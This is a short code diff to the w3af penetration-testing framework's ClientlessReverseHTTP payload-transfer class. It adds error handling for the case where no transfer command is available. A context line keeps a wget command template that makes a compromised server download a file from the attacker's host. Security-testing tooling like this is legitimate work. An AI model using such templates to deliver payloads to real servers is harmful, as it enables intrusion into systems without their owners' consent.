@@ -89,8 +89,12 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
         This method is used to transfer the data_str from w3af to the
         compromised server.
         """
-        if not self._command:
-            self.can_transfer()
+        if not self._command and not self.can_transfer():
+            raise BaseFrameworkException(
+                "No supported clientless HTTP transfer command is available."
+            )
+
+        assert self._command is not None
 
         cmd_templates = {
             "wget": "wget http://%s:%s/%s -O %s",
